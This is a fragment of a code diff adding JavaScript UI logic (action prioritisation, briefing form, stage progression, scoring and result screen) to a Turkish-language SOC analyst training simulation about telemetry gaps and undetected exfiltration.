+  function renderPrioTab(el) {
+    S.flags.prio = S.flags.prio || {};
+    var locked = S.flags.prio_locked;
+    var pool = PRIO_ITEMS.filter(function (p) { return !S.flags.prio[p.id]; });
+    el.innerHTML = '<p style="font-size:11px;color:var(--muted);margin-bottom:10px">Atanmamış aksiyonları <b>sürükleyip</b> ilgili kutuya bırakın (Acil / Bu hafta / Bu ay). Geri almak için kartı tekrar «Atanmamış» alanına sürükleyin.</p>' +
+      (S.flags.s10_done && !S.flags.prio_wrong ? '<p class="tag ok" style="margin-bottom:8px">✓ Önceliklendirme tamamlandı</p>' : "") +
+      '<div class="prio-cols' + (locked ? " prio-locked" : "") + '">' + ['urgent', 'week', 'month'].map(function (cat) {
+        var labels = { urgent: "Acil", week: "Bu hafta", month: "Bu ay" };
+        return '<div class="prio-col ' + cat + '" data-cat="' + cat + '"><h5>' + labels[cat] + '</h5>' +
+          PRIO_ITEMS.filter(function (p) { return S.flags.prio[p.id] === cat; }).map(function (p) {
+            return '<div class="prio-item in" data-id="' + p.id + '">' + esc(p.text) + '</div>';
+          }).join("") + '</div>';
+      }).join("") + '</div>' +
+      '<div style="margin-top:10px"><h4 style="font-size:11px;color:var(--muted);margin-bottom:6px">Atanmamış</h4>' +
+      '<div class="prio-pool' + (locked ? " prio-locked" : "") + '" id="prioPool" data-cat="">' +
+      (pool.length ? pool.map(function (p) {
+        return '<div class="prio-item" data-id="' + p.id + '">' + esc(p.text) + '</div>';
+      }).join("") : '<span style="font-size:10px;color:var(--muted)">Tüm kartlar atandı</span>') + '</div></div>' +
+      '<button type="button" class="btn" id="btnPrioCheck" style="margin-top:12px"' + (locked ? " disabled" : "") + '>Sınıflandırmayı doğrula</button>' +
+      (S.flags.prio_show_explain ? prioExplainBlock() : "");
+    bindPrioDragDrop(el);
+    var btnPrio = el.querySelector("#btnPrioCheck");
+    if (btnPrio && !locked) {
+      btnPrio.onclick = function () {
+        if (S.flags.prio_locked) return;
+        var ok = PRIO_ITEMS.every(function (p) { return S.flags.prio[p.id] === p.cat; });
+        S.flags.prio_locked = true;
+        S.flags.s10_done = true;
+        if (ok) {
+          S.flags.prio_wrong = false;
+          S.flags.prio_show_explain = false;
+          setMissionFb("Önceliklendirme doğru.", "ok");
+        } else {
+          S.flags.prio_wrong = true;
+          S.flags.prio_show_explain = true;
+          applyWrongAnswerPenalty("prio");
+          clearMissionFbForWrongQuestion();
+        }
+        updateMissionDesk();
+        if (S.windows.irportal) refreshWindow("irportal");
+      };
+    }
+  }
+
+  function renderBriefTab(el) {
+    if (!S.flags.brief_seeded) {
+      S.flags.brief = {
+        bulgu: BRIEF_DEFAULTS.bulgu,
+        etki: BRIEF_DEFAULTS.etki,
+        kanit: BRIEF_DEFAULTS.kanit,
+        oneri: BRIEF_DEFAULTS.oneri
+      };
+      S.flags.brief_seeded = true;
+    }
+    ensureBriefDefaults();
+    el.innerHTML = ['bulgu', 'etki', 'kanit', 'oneri'].map(function (key) {
+      var labels = { bulgu: "Bulgu", etki: "Etki", kanit: "Kanıt", oneri: "Öneri" };
+      return '<div class="brief-section"><label>' + labels[key] + '</label><textarea id="brief-' + key + '">' + esc((S.flags.brief || {})[key] || "") + '</textarea></div>';
+    }).join("") +
+      '<p class="small muted" id="briefHint" style="margin:8px 0">Örnek metinler vaka özetine göre dolduruldu; düzenleyebilir veya olduğu gibi gönderebilirsiniz. Her bölüm en az 40 karakter olmalı.</p>' +
+      '<button type="button" class="btn ok" id="btnBrief">Briefing Hazırla</button>';
+    ["bulgu", "etki", "kanit", "oneri"].forEach(function (key) {
+      var ta = el.querySelector("#brief-" + key);
+      if (ta) {
+        ta.oninput = function () {
+          S.flags.brief = S.flags.brief || {};
+          S.flags.brief[key] = ta.value;
+          updateBriefBtn(el);
+        };
+      }
+    });
+    updateBriefBtn(el);
+    var btnBrief = el.querySelector("#btnBrief");
+    if (btnBrief) {
+      btnBrief.onclick = function () {
+        if (!briefFieldsReady()) {
+          setMissionFb("Her bölüm en az 40 karakter olmalı.", "warn");
+          updateMissionDesk();
+          return;
+        }
+        S.flags.s11_done = true;
+        S.flags.done11 = true;
+        setMissionFb("Briefing SOC Lead'e iletildi.", "ok");
+        showToast("Briefing gönderildi — simülasyon tamamlandı.", "ok");
+        showResult();
+      };
+    }
+  }
+
+  function renderMissionDesk(body) {
+    var m = MISSIONS[S.scene - 1];
+    var objectivesOk = missionComplete();
+    body.innerHTML = '<div class="mis-app"><div class="mis-stage">Aşama ' + S.scene + '/11 · ' + esc(SCENES[S.scene - 1]) + '</div>' +
+      '<div class="mis-title">SOC Mission Desk</div>' +
+      '<div class="mis-obj">' + esc(m.obj) + '</div>' +
+      '<p class="small muted" style="margin-bottom:8px">Aşama ipucu için sağ üstteki <b>💡 İpucu</b> butonunu kullanın.</p>' +
+      '<ul class="mis-steps">' + m.steps.map(function (s) { return '<li>' + esc(s) + '</li>'; }).join("") + '</ul>' +
+      '<div class="mis-fb' + (S.feedbackType ? ' ' + S.feedbackType : '') + '" id="misFb">' + esc(S.feedback || "") + '</div>' +
+      (objectivesOk ? '' : '<p class="small muted" style="margin-bottom:8px">Sonraki aşamaya geçmek için bu aşamadaki tüm görevleri tamamlayın.</p>') +
+      '<button type="button" class="btn" id="btnNext"' + (objectivesOk ? "" : " disabled") + '>Devam Et →</button></div>';
+    var btnNext = body.querySelector("#btnNext");
+    if (btnNext) btnNext.onclick = advanceMission;
+  }
+
+  function updateMissionDesk() {
+    if (missionComplete()) {
+      if (!S.flags["stageReady" + S.scene]) {
+        S.flags["stageReady" + S.scene] = true;
+        openMissionDeskForStage();
+        showToast("Aşama " + S.scene + " tamamlandı — Devam Et ile ilerleyebilirsiniz.", "ok");
+        return;
+      }
+    }
+    if (S.windows.mission) refreshWindow("mission");
+  }
+
+  function openMissionDeskForStage() {
+    if (!S.windows.mission) {
+      openWindow("mission");
+    } else {
+      if (S.minimized.mission) {
+        S.minimized.mission = false;
+        var w = $("win-mission");
+        if (w) w.classList.remove("hidden");
+      }
+      refreshWindow("mission");
+    }
+    focusWindow("mission");
+  }
+
+  function advanceMission() {
+    if (!missionComplete()) {
+      setMissionFb("Bu aşamadaki tüm görevler tamamlanmalı (kanıtlar, sorgular, sorular).", "warn");
+      updateMissionDesk();
+      return;
+    }
+    S.flags["done" + S.scene] = true;
+    if (S.scene >= 11) { showResult(); return; }
+    S.scene++;
+    if (S.scene > S.maxScene) S.maxScene = S.scene;
+    S.feedback = ""; S.feedbackType = "";
+    renderIcons(); renderStartMenu();
+    showToast("Aşama " + S.scene + ": " + SCENES[S.scene - 1], "ok");
+    if (STAGE_TOAST_NUDGES[S.scene - 1]) showToast(STAGE_TOAST_NUDGES[S.scene - 1], "warn");
+    if (S.scene === 2) { openWindow("assets"); openWindow("terminal"); }
+    if (S.scene === 5) openWindow("firewall");
+    if (S.scene === 7) openWindow("proxy");
+    if (S.scene === 8) openWindow("timeline");
+    if (S.scene === 9) { S.irTab = "gap"; openWindow("irportal"); }
+    if (S.scene === 10) { S.irTab = "prio"; if (S.windows.irportal) refreshWindow("irportal"); else openWindow("irportal"); }
+    if (S.scene === 11) { S.irTab = "brief"; if (S.windows.irportal) refreshWindow("irportal"); }
+    openMissionDeskForStage();
+  }
+
+  function showResult() {
+    if (!S.flags.trackerSaved && window.SimulationTracker && window.SimulationTracker.saveCompletion) {
+      S.flags.trackerSaved = true;
+      window.SimulationTracker.saveCompletion(SIM_ID, SIM_NAME, {
+        score: S.score,
+        maxScore: SCORE_MAX,
+        moduleName: "soc",
+        hintUsedCount: (S.hintDeductions || []).length,
+        wrongCount: (S.wrongDeductions || []).length
+      });
+    }
+    if (S.chronoId) clearInterval(S.chronoId);
+    $("desktop").classList.add("hidden");
+    var rs = $("resultScreen");
+    rs.classList.remove("hidden");
+    var chrono = $("chronoDesk") ? $("chronoDesk").textContent : "00:00";
+    var hintList = (S.hintDeductions || []).length
+      ? S.hintDeductions.map(function (d) { return "<li>" + esc(d.label) + ": −" + d.points + " puan</li>"; }).join("")
+      : "<li>İpucu kullanılmadı — ek düşüş yok</li>";
+    var wrongList = (S.wrongDeductions || []).length
+      ? S.wrongDeductions.map(function (d) { return "<li>" + esc(d.label) + ": −" + d.points + " puan</li>"; }).join("")
+      : "<li>Yanlış cevap cezası uygulanmadı</li>";
+    var totalDeduct = (S.hintDeductions || []).reduce(function (a, d) { return a + d.points; }, 0) +
+      (S.wrongDeductions || []).reduce(function (a, d) { return a + d.points; }, 0);
+    rs.innerHTML = '<div class="result-card"><h1>Simülasyon Tamamlandı — Alarm Yoktu, Ama Olay Vardı</h1>' +
+      '<p style="color:var(--muted);margin:12px 0;line-height:1.7">Bir SOC analisti olarak sadece alarm ekranına bakmadın. Ekranın neden boş olduğunu sorguladın. Gerçek olayın görünürlük boşlukları nedeniyle kaçtığını kanıtladın.</p>' +
+      '<p style="color:var(--muted)">Analist: <b>' + esc(S.name) + '</b></p>' +
+      '<div class="result-grid"><div class="box"><b>' + S.score + '</b><span>/ ' + SCORE_MAX + ' Toplam Puan</span></div>' +
+      '<div class="box"><b>' + totalDeduct + '</b><span>Toplam Düşüş</span></div>' +
+      '<div class="box"><b>' + S.evidence.length + '</b><span>Kanıt</span></div>' +
+      '<div class="box"><b>' + chrono + '</b><span>Vardiya Süresi</span></div></div>' +
+      '<h3 style="margin-top:18px;font-size:14px">Puan özeti</h3>' +
+      '<p style="font-size:12px;color:var(--muted);margin-bottom:8px">Başlangıç: ' + SCORE_MAX + ' puan. İpucu ve yanlış cevaplar tek seferlik düşülür.</p>' +
+      '<p style="font-size:11px;color:var(--warn);margin:4px 0 2px"><b>İpucu düşüşleri</b></p><ul class="learn" style="margin-top:0">' + hintList + '</ul>' +
+      '<p style="font-size:11px;color:var(--crit);margin:12px 0 2px"><b>Yanlış cevap düşüşleri</b></p><ul class="learn" style="margin-top:0">' + wrongList + '</ul>' +
+      '<h3 style="margin-top:20px;font-size:14px">Öğrenme kazanımları</h3><ul class="learn">' +
+      '<li>Telemetri boşluğu analizi</li><li>Connector health kontrolü</li><li>Linux auth.log ve rsyslog mantığı</li>' +
+      '<li>Auditd\'nin SOC açısından önemi</li><li>Detection kural bağımlılığı</li><li>Firewall ve proxy log korelasyonu</li>' +
+      '<li>Exfiltration belirtisi yorumlama</li><li>Zaman çizelgesi çıkarma</li><li>Risk bazlı aksiyon önceliklendirme</li><li>SOC Lead\'e briefing verme</li></ul>' +
+      '<div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:24px">' +
+      '<a href="/simulations.html" class="btn ghost" style="text-decoration:none;display:inline-block">← Simülasyonlar</a>' +
+      '<button type="button" class="btn" onclick="location.reload()">Yeniden başlat</button></div></div>';
+  }
+
+  function toggleStart() {
+    var sm = $("startMenu");
+    if (sm.classList.contains("hidden")) { renderStartMenu(); sm.classList.remove("hidden"); }
+    else sm.classList.add("hidden");
+  }
+
+  function selectIcon(id) { S.selectedIcon = id; renderIcons(); }
+
+  function initDesktop() {
+    S.maxScene = 11;
+    S.score = SCORE_MAX;
+    S.hintDeductions = [];
+    S.wrongDeductions = [];
+    updateScoreDisplay();
+    renderIcons(); renderStartMenu(); renderTaskbar();
+    openWindow("mission"); openWindow("mail");
+    showToast("Tüm SOC araçları masaüstünde aktif. Başlangıç puanı " + SCORE_MAX + "/100. RedSentinel e-postasından başlayın.", "ok");
+  }
+
+  function startSimulation() {
+    var nameInp = $("analystName");
+    var n = nameInp ? nameInp.value.trim() : "";
+    if (!n) {
+      alert("Lütfen analist adınızı girin.");
+      if (nameInp) nameInp.focus();
+      return;
+    }
+    S.name = n;
+    $("intro").classList.add("hidden");
+    $("desktop").classList.remove("hidden");
+    startChrono();
+    initDesktop();
+    if (window.SimulationTracker && window.SimulationTracker.recordStart) {
+      window.SimulationTracker.recordStart(SIM_ID, SIM_NAME, { moduleName: "soc" });
+    }
+  }
+
+  var btnStart = $("btnStart");
+  if (btnStart) btnStart.addEventListener("click", startSimulation);
+
+  var nameInp = $("analystName");
+  if (nameInp) {
+    nameInp.addEventListener("keydown", function (ev) {
+      if (ev.key === "Enter") {
+        ev.preventDefault();
+        startSimulation();
+      }
+    });
+  }
+
+  var btnHint = $("btnStageHint");
+  if (btnHint) btnHint.addEventListener("click", showStageHint);
+  var btnHintAck = $("btnHintAck");
+  if (btnHintAck) btnHintAck.addEventListener("click", acknowledgeHintPolicy);
+
+  $("btnStartMenu").onclick = toggleStart;
+  document.addEventListener("click", function (e) {
+    if (!$("startMenu").contains(e.target) && e.target !== $("btnStartMenu")) $("startMenu").classList.add("hidden");
+  });
+
+  window.KN = {
+    open: openWindow, close: closeWindow, minimize: minimizeWindow, maximize: maximizeWindow,
+    restore: restoreWindow, toggleStart: toggleStart, selectIcon: selectIcon,
+    closeHint: closeStageHint,
+    ackHintPolicy: acknowledgeHintPolicy
+  };
+})();
+
+</script>
+  <script src="/js/api-base.js"></script>
+  <script src="/simulation/simulation-access-check.js"></script>
+</body>
+</html>
